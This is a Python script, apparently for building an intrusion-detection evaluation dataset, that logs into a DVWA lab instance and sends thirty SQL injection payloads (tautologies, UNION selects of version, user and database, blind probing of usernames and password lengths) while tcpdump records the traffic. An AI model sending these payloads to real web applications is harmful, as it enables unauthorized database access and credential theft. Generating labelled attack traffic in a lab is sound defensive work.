import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS SQLI EVALUACION
# DISTINTOS a los de entrenamiento_sqli.py
# =============================================

PAYLOADS_SQLI_EVALUACION = [
    "1' AND 1=1 AND '1'='1",
    "1' AND 1=2 AND '1'='1",
    "' OR 'unusual'='unusual",
    "1' OR 2>1--",
    "1' OR 2<1--",
    "' OR 4=4--",
    "' OR 5=5--",
    "1' AND SUBSTRING(version(),1,1)='5'--",
    "1' AND SUBSTRING(version(),1,1)='8'--",
    "1' AND MID(version(),1,1)='5'--",
    "' UNION SELECT version(), null--",
    "' UNION SELECT user(), null--",
    "' UNION SELECT database(), null--",
    "' UNION SELECT null, version()--",
    "' UNION SELECT null, user()--",
    "1' AND CHAR(39)=CHAR(39)--",
    "1' AND ORD(MID(username,1,1))>64--",
    "1' AND ORD(MID(username,1,1))<128--",
    "' OR LCASE(username)='admin'--",
    "' OR UCASE(username)='ADMIN'--",
    "1' AND LENGTH(password)>5--",
    "1' AND LENGTH(password)>10--",
    "' UNION SELECT 'a','b'--",
    "' UNION SELECT 'x','y'--",
    "1' AND (SELECT 1 FROM users LIMIT 1)=1--",
    "1' AND (SELECT COUNT(username) FROM users)>0--",
    "' OR STRCMP(username,'admin')=0--",
    "' OR INSTR(username,'adm')>0--",
    "1' AND LOCATE('admin',username)>0--",
    "' OR FIELD(username,'admin','gordonb')>0--",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_sqli_eval(session):
    print("\n[*] Iniciando ataques SQLi (evaluacion)...")
    payloads = PAYLOADS_SQLI_EVALUACION.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/sqli/",
                            params={"id": payload, "Submit": "Submit"})
            print(f"  SQLi_EVAL | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] SQLi evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  EVALUACION: SQL INJECTION")
    print("  Target: " + BASE_URL)
    print("  Etiqueta real: 'sqli'")
    print("")
    print("  !! IMPORTANTE !!")
    print("  NO subir el pcap a Elasticsearch.")
    print("  Guardarlo como: evaluacion_sqli.pcap")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_sqli_eval(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump y guarda el pcap como:")
    print("  evaluacion_sqli.pcap")
    print("="*60)
